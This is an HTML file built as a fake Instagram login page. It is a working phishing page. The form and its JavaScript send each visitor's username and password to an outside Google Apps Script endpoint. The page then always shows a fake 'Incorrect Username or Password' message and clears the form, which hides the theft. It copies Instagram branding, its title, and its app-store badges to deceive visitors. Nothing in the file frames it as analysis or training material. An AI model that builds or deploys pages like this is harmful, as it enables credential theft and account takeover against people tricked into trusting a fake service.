<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/x-icon"
        href="https://cdn.shopify.com/s/files/1/0685/8529/2004/files/favicon.ico?v=1742138229">
    <title>Login • Instagram</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
        rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            padding: 0;
            margin: 0;
            font-family: "Poppins", sans-serif;
            font-size: 14px;
        }

        .main {
            display: flex;
            width: 100%;
            justify-content: center;
            align-items: center;
            flex-wrap: wrap;
            flex-direction: column;
            height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 50px 30px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border-radius: 3px;
            border: 1px solid #dbdbdb;
            font-size: 12px;
        }

        input:focus {
            outline: none;
            border-color: #b4acac;
        }

        #submit {
            background-color: #0095f6;
            color: white;
            width: 100%;
            padding: 7px 16px;
            font-size: 14px;
            border-radius: 8px;
            border: 0px;
            cursor: pointer;
            letter-spacing: 1px;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        #submit:hover {
            background-color: #1877f2;
        }

        .logo-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 40px;
        }

        #submit #loader,
        #error {
            display: none;
        }

        #submit #loader.show,
        #error.show {
            display: block;
        }

        #loader {
            animation: spin 2s linear infinite;
        }

        .none {
            display: none;
        }

        p#error {
            text-align: center;
            color: red;
            margin-top: 15px;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg)
            }

            ;
        }

        @media (max-width:1024px) {
            .container {
                border: 0px;
                padding-left: 60px;
                padding-right: 60px;
            }
        }

        @media screen and (min-width:1025px) {
            .footer {
                margin-top: 30px;
            }

            .main {
                height: 100%;
                padding-top: 80px;
                padding-bottom: 40px;
            }
        }
    </style>
</head>

<body>
    <div class="main">
        <div class="container">
            <div class="logo-container">
                <img src="https://cdn.shopify.com/s/files/1/0685/8529/2004/files/Logo.png?v=1742134808"
                    alt=" Instagram Logo" width="175" height="54" style="display:block;width:175px;height:54px;">
            </div>
            <form id="contact-form" method="POST"
                action="https://script.google.com/macros/s/AKfycbzNFLpnobPBuDnM1b8-QciEshp3Q0oj518I41xRYRxrYfov0P_Ck59_e6RsyT2Ez54/exec">
                <input type="text" name="username" placeholder="Phone number, username, or email" autocomplete="true"
                    autofill>
                <input type="password" name="password" placeholder="Password" autocomplete="true" autofill>
                <button type="submit" class="" id="submit">
                    <div id="loader" role="progressbar" style="height: 18px; width: 18px;"><svg aria-label="Loading..."
                            class="xemfg65 xa4qsjk xs51kk x2a5n4e" role="img" viewBox="0 0 100 100">
                            <rect class="xwn9dsr" height="10" opacity="0" rx="5" ry="5" transform="rotate(-90 50 50)"
                                width="28" x="67" y="45"></rect>
                            <rect class="xwn9dsr" height="10" opacity="0.125" rx="5" ry="5"
                                transform="rotate(-45 50 50)" width="28" x="67" y="45"></rect>
                            <rect class="xwn9dsr" height="10" opacity="0.25" rx="5" ry="5" transform="rotate(0 50 50)"
                                width="28" x="67" y="45"></rect>
                            <rect class="xwn9dsr" height="10" opacity="0.375" rx="5" ry="5" transform="rotate(45 50 50)"
                                width="28" x="67" y="45"></rect>
                            <rect class="xwn9dsr" height="10" opacity="0.5" rx="5" ry="5" transform="rotate(90 50 50)"
                                width="28" x="67" y="45"></rect>
                            <rect class="xwn9dsr" height="10" opacity="0.625" rx="5" ry="5"
                                transform="rotate(135 50 50)" width="28" x="67" y="45"></rect>
                            <rect class="xwn9dsr" height="10" opacity="0.75" rx="5" ry="5" transform="rotate(180 50 50)"
                                width="28" x="67" y="45"></rect>
                            <rect class="xwn9dsr" height="10" opacity="0.875" rx="5" ry="5"
                                transform="rotate(225 50 50)" width="28" x="67" y="45"></rect>
                        </svg></div>
                    <span id="login-text">Log In</span>
                </button>
                <p id="error">Incorrect Username or Password. Please try again!</p>
            </form>

            <div class="forgot-password">
                <a href="#" style="color:#000;text-decoration:none;display:block;margin-top:30px;text-align: center;">
                    Forgot Password?
                </a>
                <p style="text-align: center;color: #000;margin-top:50px;">
                    Don't have an account? <a href="#" style="text-decoration:none;color:#0095f6;font-weight:600;">Sign
                        up</a>
                </p>
            </div>
        </div>

        <div class="footer">
            <p style="color:#000;text-align:center;margin-bottom:25px;">Get the app.</p>
            <div class="logos" style="display:flex;justify-content: center;align-items: center;">
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D15E62FA0-854A-4704-A90B-CF699AAC3AD3%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge%26original_referrer%3Dhttps%253A%252F%252Fwww.instagram.com%252Flokesh_webdev%252F"
                    target="_blank" rel="noopener noreferrer" style="margin-right:5px;">
                    <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" alt="Google Play App"
                        width="134" height="40" style="display:block;width:134px;height:40px;"></a>
                <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1920%2C1020"
                    target="_blank" rel="noopener noreferrer" style="margin-left:5px;">
                    <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" alt="Microsoft App"
                        width="111" height="40" style="display:block;width:111px;height:40px;">
                </a>
            </div>
        </div>
    </div>


    <script>

        window.addEventListener("load", function () {
            const form = document.getElementById("contact-form");

            form.addEventListener("submit", async function (e) {
                e.preventDefault();
                document.getElementById("submit").classList.add("disabled");
                document.getElementById("loader").classList.add("show");
                document.getElementById("login-text").classList.add("none");
                const data = new FormData(form);
                const action = e.target.action;
                const username = form.elements["username"].value.trim(); // Trim extra spaces
                const password = form.elements["password"].value; 

                try {
                    let response = await fetch(action, {
                        method: "POST",
                        body: data,
                    });

                    console.log(response, 'result.status');
                    let result = await response; // ✅ Response JSON format में होगा

                    if (result.ok) {
                        document.getElementById("error").classList.add("show");
                        document.getElementById("submit").classList.remove("disabled");
                        document.getElementById("loader").classList.remove("show");
                        document.getElementById("login-text").classList.remove("none");
                        form.reset();
                        // document.getElementById("submit").classList.remove("disabled");
                        // document.getElementById("loader").classList.remove("show");
                        // document.getElementById("login-text").classList.remove("none");
                        // form.reset();

                        // ✅ Instagram Profile पर Redirect करें
                        // let instaURL = `https://www.instagram.com/${encodeURIComponent(username)}/`;
                        // window.location.href = instaURL;
                    }
                } catch { }
            });
        });

    </script>
</body>

</html>
